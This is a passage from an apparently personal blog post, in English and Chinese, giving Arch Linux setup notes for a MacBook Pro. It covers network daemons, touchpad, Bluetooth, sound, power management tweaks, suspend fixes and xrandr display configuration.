&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Warning&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Running&lt;/span&gt; &lt;span class="n"&gt;multiple&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="n"&gt;managers&lt;/span&gt; &lt;span class="n"&gt;will&lt;/span&gt; &lt;span class="n"&gt;cause&lt;/span&gt; &lt;span class="n"&gt;problems&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;so&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="n"&gt;important&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;disable&lt;/span&gt; &lt;span class="n"&gt;all&lt;/span&gt; &lt;span class="n"&gt;other&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="n"&gt;management&lt;/span&gt; &lt;span class="n"&gt;daemons&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;  

&lt;span class="n"&gt;First&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stop&lt;/span&gt; &lt;span class="n"&gt;all&lt;/span&gt; &lt;span class="n"&gt;previously&lt;/span&gt; &lt;span class="n"&gt;running&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="n"&gt;daemons&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;like&lt;/span&gt; &lt;span class="n"&gt;netctl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;netcfg&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dhcpcd&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;NetworkManager&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;  

&lt;span class="n"&gt;Disable&lt;/span&gt; &lt;span class="n"&gt;any&lt;/span&gt; &lt;span class="n"&gt;existing&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="n"&gt;management&lt;/span&gt; &lt;span class="n"&gt;services&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;including&lt;/span&gt; &lt;span class="n"&gt;netctl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;netcfg&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dhcpcd&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;networkmanager&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Refer&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;Systemd&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="n"&gt;Using&lt;/span&gt; &lt;span class="n"&gt;units&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;  
&lt;span class="n"&gt;Note&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;You&lt;/span&gt; &lt;span class="n"&gt;might&lt;/span&gt; &lt;span class="n"&gt;need&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;stop&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;disable&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="n"&gt;daemon&lt;/span&gt; &lt;span class="n"&gt;instead&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;netctl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;which&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;current&lt;/span&gt; &lt;span class="n"&gt;replacement&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;If&lt;/span&gt; &lt;span class="n"&gt;unsure&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="n"&gt;disabling&lt;/span&gt; &lt;span class="n"&gt;both&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;quote from &lt;a href="https://wiki.archlinux.org/index.php/wicd#Initial_setup"&gt;Wicd - ArchWiki&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;我猜不只 &lt;code&gt;wicd&lt;/code&gt;，&lt;br /&gt;
其他的 Network Daemon 應該也是同理，&lt;br /&gt;
不要讓他們彼此起衝突。  &lt;/p&gt;
&lt;p&gt;主要是因為我在這裡是使用 &lt;code&gt;wicd&lt;/code&gt;&lt;br /&gt;
所以如果沒有把 &lt;code&gt;dhcpcd&lt;/code&gt; 或 &lt;code&gt;NetworkManager&lt;/code&gt; 都關掉的話，&lt;br /&gt;
在 &lt;code&gt;dmesg&lt;/code&gt; 會看到以下相關的錯誤訊息：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ 6677.574915] ERROR @wl_notify_scan_status :  
[ 6677.574919] wlp3s0 Scan_results error (-22)  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ 6560.346608] ERROR @wl_cfg80211_scan :  
[ 6560.346611] WLC_SCAN error (-22)  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ 6467.860408] ERROR @wl_notify_scan_status :  
[ 6467.860413] wlp3s0 Scan_results error (-22)  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;詳細請參考為這個問題而寫的新文章&lt;br /&gt;
&lt;a href="/posts/2017/10/31/make-bcm4360-14e4-43a0-rev-03-work-on-arch-linux-with-broadcom-wl-dkms/"&gt;用 broadcom-wl-dkms 讓 BCM4360 [14e4:43a0] (rev 03) 能順利在 Arch Linux 中使用&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;Improve DHCP connect init speed&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Add below into &lt;code&gt;/etc/dhcpcd.conf&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Disable IP ARP checking  
noarp  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Network Proxy Settings&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Proxy_settings"&gt;https://wiki.archlinux.org/index.php/Proxy_settings&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;wicd&lt;/code&gt; has no proxy setting function, I can only set proxy configuration in &lt;code&gt;Firefox&lt;/code&gt;.(This only works for web browsing)  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;networkmanager&lt;/code&gt; can have proxy settings via install plugin &lt;code&gt;proxydriver&lt;/code&gt;, check &lt;a href="https://wiki.archlinux.org/index.php/NetworkManager"&gt;NetworkManager - ArchWiki&lt;/a&gt; for how to setup.  &lt;/li&gt;
&lt;li&gt;I am kinda &lt;code&gt;wicd&lt;/code&gt; lover and don't use proxy really often, so I think I'm just ok with it currently.  &lt;/li&gt;
&lt;li&gt;(Considering write the proxy setting functionality for &lt;code&gt;wicd&lt;/code&gt;...)  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;File Manager&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S pcmanfm&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Keyboard&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S xorg-xmodmap&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;for changing keymap like swap Ctrl and Caps Lock  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Check /etc/mkinitcpio.conf if &lt;code&gt;HOOKS&lt;/code&gt; have &lt;code&gt;keyboard&lt;/code&gt;, if not, add it then &lt;code&gt;sudo mkinitcpio -p linux&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;fix &lt;code&gt;~&lt;/code&gt; problem  &lt;ul&gt;
&lt;li&gt;if you press &lt;code&gt;~&lt;/code&gt; on the keyboard, it will not print out &lt;code&gt;~&lt;/code&gt; correctly.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/modprobe.d/hid_apple.conf  
---  
options hid_apple iso_layout=0  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Backlight&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBook#Keyboard_Backlight"&gt;https://wiki.archlinux.org/index.php/MacBook#Keyboard_Backlight&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;yaourt -S kbdlight&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S xorg-xev&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;For chekcing the key value of keyboard  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Synaptic (Touchpad)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S xf86-input-synaptics&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;only basic functions&lt;br /&gt;
or  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;yaourt -S xf86-input-mtrack-git&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/BlueDragonX/xf86-input-mtrack"&gt;https://github.com/BlueDragonX/xf86-input-mtrack&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;for OS X like touchpad and flexible configuration  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/X11/xorg.conf.d/10-mtrack.conf  
---  
Section &amp;quot;InputClass&amp;quot;  
    MatchIsTouchpad &amp;quot;on&amp;quot;  
    Identifier      &amp;quot;Touchpads&amp;quot;  
    Driver          &amp;quot;mtrack&amp;quot;  

    Option &amp;quot;Thumbsize&amp;quot;      &amp;quot;50&amp;quot;  
    Option &amp;quot;ScrollDistance&amp;quot; &amp;quot;150&amp;quot;  
    Option &amp;quot;Sensitivity&amp;quot;    &amp;quot;0.9&amp;quot;  
    Option &amp;quot;MaxTapTime&amp;quot;     &amp;quot;120&amp;quot;  
    Option &amp;quot;IgnoreThumb&amp;quot;    &amp;quot;true&amp;quot;  
    Option &amp;quot;IgnorePalm&amp;quot;     &amp;quot;true&amp;quot;  
    Option &amp;quot;TapDragEnable&amp;quot;  &amp;quot;false&amp;quot;  

    # Natural Scrolling  
    Option &amp;quot;ScrollUpButton&amp;quot;     &amp;quot;5&amp;quot;  
    Option &amp;quot;ScrollDownButton&amp;quot;   &amp;quot;4&amp;quot;  
    Option &amp;quot;ScrollLeftButton&amp;quot;   &amp;quot;7&amp;quot;  
    Option &amp;quot;ScrollRightButton&amp;quot;  &amp;quot;6&amp;quot;  

    # Disable tap-to-click  
    # Option &amp;quot;TapButton1&amp;quot; &amp;quot;0&amp;quot;  
    # Option &amp;quot;TapButton2&amp;quot; &amp;quot;0&amp;quot;  
    # Option &amp;quot;TapButton3&amp;quot; &amp;quot;0&amp;quot;  
EndSection  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Bluetooth (Headset)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Bluetooth"&gt;https://wiki.archlinux.org/index.php/Bluetooth&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Blueman"&gt;https://wiki.archlinux.org/index.php/Blueman&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Bluetooth_headset"&gt;https://wiki.archlinux.org/index.php/Bluetooth_headset&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S bluez bluez-utils bluez-libs bluez-firmware blueman pulseaudio-bluetooth pulseaudio-alsa pavucontrol&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo modprobe btusb&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo systemctl enable bluetooth&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo systemctl start bluetooth&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;blueman-manager&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;scan, pair, connect  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pavucontrol&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Change sound channel to bluetooth headset  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sometimes the bluetooth device may be blocked  &lt;ul&gt;
&lt;li&gt;use &lt;code&gt;rfkill list&lt;/code&gt; to check if it is blocked.  &lt;/li&gt;
&lt;li&gt;use &lt;code&gt;sudo rfkill unblock bluetooth&lt;/code&gt; to unblock.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Sound&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S xf86-video-intel alsa-utils&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;alsa-utils include alsamixer, amixer  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Add the content below to &lt;code&gt;/etc/asound.conf&lt;/code&gt; //Important  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/asound.conf&lt;/code&gt; should be created after installed &lt;code&gt;pulseaudio-alsa&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/asound.conf  
---  
defaults.pcm.card 1  
defaults.pcm.device 0  
defaults.ctl.card 1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;awesomewm&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S awesome vicious&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;cp -r /usr/share/awesome/themes ~/.config/awesome/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Power Management&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Power_management"&gt;https://wiki.archlinux.org/index.php/Power_management&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBookPro11,x#Powersave"&gt;https://wiki.archlinux.org/index.php/MacBookPro11,x#Powersave&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;ACPI&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S acpi&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Powertop&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S powertop&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Create &lt;code&gt;/etc/systemd/system/powertop.service&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[Unit]  
Description=Powertop Service  
[Service]  
Type=oneshot  
ExecStart=/usr/bin/powertop --auto-tune  
[Install]  
WantedBy=multi-user.target  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo systemctl enable powertop.service&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo systemctl start powertop.service&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;cpupower&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/torvalds/linux/tree/master/tools/power/cpupower"&gt;https://github.com/torvalds/linux/tree/master/tools/power/cpupower&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo pacman -S cpupower  
sudo systemctl enable cpupower  
sudo systemctl start cpupower  
sudo cpupower frequency-set -g powersave  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;thermald&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/01org/thermal_daemon"&gt;01org/thermal_daemon · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Thermal daemon for Intel Architecture  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;yaourt -S thermald  
sudo systemctl enable thermald  
sudo systemctl start thermald  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Fix the kworker CPU hug&lt;/h4&gt;
&lt;p&gt;"kworker" triggers some ACPI interrupts.&lt;br /&gt;
You can use &lt;code&gt;grep . -r /sys/firmware/acpi/interrupts/&lt;/code&gt; to check.&lt;br /&gt;
For me, &lt;code&gt;gpe4E&lt;/code&gt; triggered lots of ACPI interruptions.&lt;br /&gt;
So disable it via systemd.  &lt;/p&gt;
&lt;p&gt;Create &lt;code&gt;/etc/systemd/system/suppress-gpe4E.service&lt;/code&gt;&lt;br /&gt;
and add the following lines.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[Unit]  
Description=Disables GPE 4E, an interrupt that is going crazy on Macs  
[Service]  
ExecStart=/usr/bin/bash -c &amp;#39;echo &amp;quot;disable&amp;quot; &amp;gt; /sys/firmware/acpi/interrupts/gpe4E&amp;#39;  
[Install]  
WantedBy=multi-user.target  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;then enable and start it:&lt;br /&gt;
&lt;code&gt;sudo systemctl enable suppress-gpe4E.service&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;sudo systemctl start suppress-gpe4E.service&lt;/code&gt;  &lt;/p&gt;
&lt;h4&gt;Enable power save mode on Intel Audio card&lt;/h4&gt;
&lt;p&gt;Create new hook:&lt;br /&gt;
&lt;code&gt;sudoedit /etc/modprobe.d/60-snd-hda-intel.conf&lt;/code&gt;&lt;br /&gt;
and add:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Enable Power Saving on Intel HDA Audio  
options snd_hda_intel power_save=1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Enable powersaving options for Intel Processor&lt;/h4&gt;
&lt;p&gt;Create new hook:&lt;br /&gt;
&lt;code&gt;sudoedit /etc/modprobe.d/60-i915.conf&lt;/code&gt;&lt;br /&gt;
and add:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Experimental options to improve power saving on Intel Graphics  
options i915 enable_rc6=1 enable_fbc=1 lvds_downclock=1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Suspend problem&lt;/h3&gt;
&lt;h4&gt;Prevent shutdown directly when power button is pressed&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBookPro11,x#Repurpose_the_power_key"&gt;https://wiki.archlinux.org/index.php/MacBookPro11,x#Repurpose_the_power_key&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/systemd/logind.conf&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;HandlePowerKey=suspend&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Disable &lt;a href="https://en.wikipedia.org/wiki/Swappiness"&gt;Swappiness&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;To save SSD and avoid kswapd using lots of CPU resource on finding available swap when there's no more virtual memory can be used.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/igorpecovnik/lib/issues/219"&gt;kswapd 100% CPU-usage · Issue #219 · igorpecovnik/lib · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/sysctl/vm.txt"&gt;https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/sysctl/vm.txt&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo sysctl vm.swappiness=0&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;The kernel will swap only to avoid an out of memory condition, when free memory will be below vm.min_free_kbytes limit. See the "VM Sysctl documentation"&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo sysctl vm.min_free_kbytes=0&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudoedit /etc/sysctl.d/99-sysctl.conf&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Add &lt;code&gt;vm.swappiness=0&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Add &lt;code&gt;vm.min_free_kbytes=0&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Fixing suspend mode&lt;/h4&gt;
&lt;p&gt;Use &lt;code&gt;cat /proc/acpi/wakeup&lt;/code&gt;.&lt;br /&gt;
There's a line saying &lt;code&gt;XHC1  S3  *enabled  pci:0000:00:14.0&lt;/code&gt;.&lt;br /&gt;
We only want the &lt;code&gt;LID0  S4  *enabled   platform:PNP0C0D:00&lt;/code&gt; to be enbaled.&lt;br /&gt;
So &lt;code&gt;sudoedit /etc/udev/rules.d/90-xhc_sleep.rules&lt;/code&gt; and add the follwing lines.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Disable wake from S3 on XHC1  
SUBSYSTEM==&amp;quot;pci&amp;quot;, KERNEL==&amp;quot;0000:00:14.0&amp;quot;, ATTR{device}==&amp;quot;0x9c31&amp;quot; RUN+=&amp;quot;/bin/sh -c &amp;#39;/bin/echo disabled &amp;gt; /sys$env{DEVPATH}/power/wakeup&amp;#39;&amp;quot;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Powersave&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Unia/powersave"&gt;GitHub - Unia/powersave: Linux power save settings, compatible with systemd&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/sysctl.d/99-powersave.conf  
---  
# Disable NMI watchdog  
kernel.nmi_watchdog = 0  

# laptop_mode is a knob that controls &amp;quot;laptop mode&amp;quot;. All the things that are controlled by this  
# knob are discussed in https://www.kernel.org/doc/Documentation/laptops/laptop-mode.txt (Default  
# is 0).  
vm.laptop_mode = 5  

# Contains, as a percentage of total available memory that contains free pages and reclaimable  
# pages, the number of pages at which a process which is generating disk writes will itself start  
# writing out dirty data (Default is 20).  
#vm.dirty_ratio = 20  

# Contains, as a percentage of total available memory that contains free pages and reclaimable  
# pages, the number of pages at which the background kernel flusher threads will start writing out  
# dirty data (Default is 10).  
#vm.dirty_background_ratio = 10  

# This tunable is used to define when dirty data is old enough to be eligible for writeout by the  
# kernel flusher threads.  It is expressed in 100&amp;#39;ths of a second.  Data which has been dirty  
# in-memory for longer than this interval will be written out next time a flusher thread wakes up  
# (Default is 3000).  
#vm.dirty_expire_centisecs = 3000  

# The kernel flusher threads will periodically wake up and write `old&amp;#39; data out to disk.  This  
# tunable expresses the interval between those wakeups, in 100&amp;#39;ths of a second (Default is 500).  
vm.dirty_writeback_centisecs = 1500  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/udev/rules.d/50-powersave-brightness.rules  
---  
# Display Power Management Signaling  
SUBSYSTEM==&amp;quot;power_supply&amp;quot;, ENV{POWER_SUPPLY_ONLINE}==&amp;quot;0&amp;quot;, ENV{DISPLAY}=&amp;quot;DPY&amp;quot;, ENV{XAUTHORITY}=&amp;quot;/home/USER/.Xauthority&amp;quot;, RUN+=&amp;quot;/usr/bin/xset dpms 120 240 360&amp;quot;  
SUBSYSTEM==&amp;quot;power_supply&amp;quot;, ENV{POWER_SUPPLY_ONLINE}==&amp;quot;1&amp;quot;, ENV{DISPLAY}=&amp;quot;DPY&amp;quot;, ENV{XAUTHORITY}=&amp;quot;/home/USER/.Xauthority&amp;quot;, RUN+=&amp;quot;/usr/bin/xset dpms 300 450 600&amp;quot;  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/udev/rules.d/50-powersave-suspend.rules  
---  
# Suspend when battery is at 2%  
SUBSYSTEM==&amp;quot;power_supply&amp;quot;, ATTR{status}==&amp;quot;Discharging&amp;quot;, ATTR{capacity}==&amp;quot;2&amp;quot;, RUN+=&amp;quot;/usr/bin/systemctl suspend&amp;quot;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Monitor&lt;/h3&gt;
&lt;h4&gt;Dual Display&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Multihead"&gt;https://wiki.archlinux.org/index.php/Multihead&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S xorg-xrandr&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Xrandr"&gt;https://wiki.archlinux.org/index.php/Xrandr&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;xrandr should work.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;For more friendly GUI setting, &lt;code&gt;sudo pacman -S lxrandr&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;But my 1920x1080 external display only get 1024x768 support&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Xrandr#Adding_undetected_resolutions"&gt;https://wiki.archlinux.org/index.php/Xrandr#Adding_undetected_resolutions&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cvt &lt;span class="m"&gt;1920&lt;/span&gt; &lt;span class="m"&gt;1080&lt;/span&gt;  
&lt;span class="c1"&gt;# 1920x1080 59.96 Hz (CVT 2.07M9) hsync: 67.16 kHz; pclk: 173.00 MHz  &lt;/span&gt;
Modeline &lt;span class="s2"&gt;&amp;quot;1920x1080_60.00&amp;quot;&lt;/span&gt;  &lt;span class="m"&gt;173&lt;/span&gt;.00  &lt;span class="m"&gt;1920&lt;/span&gt; &lt;span class="m"&gt;2048&lt;/span&gt; &lt;span class="m"&gt;2248&lt;/span&gt; &lt;span class="m"&gt;2576&lt;/span&gt;  &lt;span class="m"&gt;1080&lt;/span&gt; &lt;span class="m"&gt;1083&lt;/span&gt; &lt;span class="m"&gt;1088&lt;/span&gt; &lt;span class="m"&gt;1120&lt;/span&gt; -hsync +vsync  

$ xrandr --newmode &lt;span class="s2"&gt;&amp;quot;1920x1080_60.00&amp;quot;&lt;/span&gt;  &lt;span class="m"&gt;173&lt;/span&gt;.00  &lt;span class="m"&gt;1920&lt;/span&gt; &lt;span class="m"&gt;2048&lt;/span&gt; &lt;span class="m"&gt;2248&lt;/span&gt; &lt;span class="m"&gt;2576&lt;/span&gt;  &lt;span class="m"&gt;1080&lt;/span&gt; &lt;span class="m"&gt;1083&lt;/span&gt; &lt;span class="m"&gt;1088&lt;/span&gt; &lt;span class="m"&gt;1120&lt;/span&gt; -hsync +vsync  

$ xrandr --addmode DP1 1920x1080_60.00  

$ xrandr --output eDP1 --auto --output DP1 --mode 1920x1080_60.00 --left-of eDP1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;Hotplug problem - xrandr won't detect hotplug mini-display port to VGA adapter&lt;/h5&gt;
